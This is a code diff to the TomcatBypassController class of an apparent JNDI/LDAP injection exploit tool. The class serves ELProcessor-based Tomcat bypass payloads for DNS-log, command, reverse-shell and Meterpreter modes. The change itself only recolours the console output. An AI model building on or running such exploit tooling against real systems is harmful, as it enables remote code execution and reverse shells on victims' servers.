@@ -14,6 +14,8 @@ import javax.naming.StringRefAddr;
 import java.io.IOException;
 import java.lang.reflect.Field;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 /*
    注意：在 Javascript 引擎时，直接使用 sun.misc.Base64Decoder 和 org.apache.tomcat.util.buf.Base64 均会抛出异常
 
@@ -34,7 +36,7 @@ public class TomcatBypassController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
@@ -111,35 +113,35 @@ public class TomcatBypassController implements LdapController {
                     throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + type);
                 }
 
-                System.out.println("[+] Paylaod: " + type);
+                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
             }catch(IllegalArgumentException e){
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(firstIndex + 1, secondIndex));
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(firstIndex + 1, secondIndex));
             }
 
             switch (type){
                 case dnslog:
                     String url = base.substring(base.lastIndexOf("/") + 1);
-                    System.out.println("[+] URL: " + url);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                     params = new String[]{url};
                     break;
                 case command:
                     String cmd = Util.getCmdFromBase(base);
-                    System.out.println("[+] Command: " + cmd);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                     params = new String[]{cmd};
                     break;
                     //可以把反弹msf的host和port在这里进行处理
                 case reverseshell:
                     String[] results = Util.getIPAndPortFromBase(base);
-                    System.out.println("[+] IP: " + results[0]);
-                    System.out.println("[+] Port: " + results[1]);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                     params = results;
                     break;
                 case meterpreter:
                     String[] results1 = Util.getIPAndPortFromBase(base);
                     Config.rhost=results1[0];
                     Config.rport=results1[1];
-                    System.out.println("[+] RemotHost: " + results1[0]);
-                    System.out.println("[+] RemotPort: " + results1[1]);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA RemotHost >> |@" + results1[0]));
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA RemotPort >> |@" + results1[1]));
                     params = results1;
 
             }
